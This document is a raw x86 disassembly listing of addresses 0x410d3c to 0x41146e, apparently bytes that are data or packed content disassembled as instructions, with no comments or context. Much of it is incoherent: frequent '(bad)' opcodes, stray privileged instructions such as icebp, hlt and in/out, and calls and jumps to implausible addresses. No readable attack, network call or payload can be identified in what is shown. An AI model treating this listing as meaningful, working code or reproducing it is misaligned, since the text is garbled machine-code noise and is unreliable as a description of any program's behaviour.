  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
